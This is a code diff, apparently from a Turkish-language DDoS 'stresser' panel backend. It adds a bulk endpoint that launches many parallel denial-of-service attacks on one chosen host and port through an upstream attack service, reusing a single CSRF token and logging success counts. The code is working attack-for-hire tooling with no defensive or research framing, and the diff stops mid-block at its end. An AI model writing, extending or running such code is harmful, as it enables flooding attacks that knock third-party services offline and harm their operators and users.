@@ -272,7 +272,7 @@ app.post('/api/stresse/attack', async (req, res) => {
 
     const minTime = getMinTime(method, layer);
     if (parseInt(time) < minTime) {
-      return res.status(400).json({ status: 'error', message: `Minimum süre ${minTime} saniye (${method})` });
+      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
     }
 
     const client = getClient(sessionId);
@@ -307,6 +307,89 @@ app.post('/api/stresse/attack', async (req, res) => {
     res.json(response.data);
   } catch (error) {
     console.error('Attack error:', error.message);
+    if (error.response) {
+      return res.status(error.response.status).json({
+        status: 'error',
+        message: error.response.data?.message || error.message,
+        data: error.response.data
+      });
+    }
+    res.status(500).json({ status: 'error', message: error.message });
+  }
+});
+
+/**
+ * POST /api/stresse/attack/bulk
+ * Body: { host, port, time, method, subnet, geo, concurrents }
+ *
+ * Ayni hedefe concurrents kadar paralel saldiri baslatir.
+ */
+app.post('/api/stresse/attack/bulk', async (req, res) => {
+  try {
+    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+
+    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4', concurrents = 1 } = req.body;
+    const rawHost = req.body.host;
+    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
+    if (!host || !port || !time || !method) {
+      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
+    }
+
+    if (isFreeMethod(method)) {
+      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
+    }
+
+    const minTime = getMinTime(method, layer);
+    if (parseInt(time) < minTime) {
+      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
+    }
+
+    const count = Math.max(1, parseInt(concurrents) || 1);
+    const client = getClient(sessionId);
+
+    // Tek CSRF token ile tum istekleri gonder
+    const csrfRes = await client.get('/csrf-token');
+    const csrfToken = csrfRes.data.csrfToken;
+
+    const attackPayload = {
+      host,
+      port: parseInt(port),
+      time: time.toString(),
+      method,
+      subnet,
+      geo
+    };
+    const attackHeaders = {
+      'Content-Type': 'application/json',
+      'X-CSRF-Token': csrfToken
+    };
+
+    const results = await Promise.all(
+      Array.from({ length: count }, () =>
+        client.post('/attack', attackPayload, { headers: attackHeaders })
+          .then((r) => ({ status: 'success', data: r.data }))
+          .catch((err) => ({ status: 'error', message: err.message, data: err.response?.data }))
+      )
+    );
+
+    const successResults = results.filter((r) => r.status === 'success' && !(r.data?.status === 'error'));
+    const failResults = results.filter((r) => r.status === 'error' || r.data?.status === 'error');
+
+    console.log(`[attack/bulk] ${host}:${port} ${method} x${count} -> ${successResults.length} success, ${failResults.length} fail`);
+
+    res.json({
+      status: 'success',
+      total: count,
+      successCount: successResults.length,
+      failCount: failResults.length,
+      results,
+      // Tek saldiriyla uyumlu donus icin ilk basarili ID
+      id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null,
+      attack_id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null
+    });
+  } catch (error) {
+    console.error('Bulk attack error:', error.message);
     if (error.response) {
       return res.status(error.response.status).json({
         status: 'error',
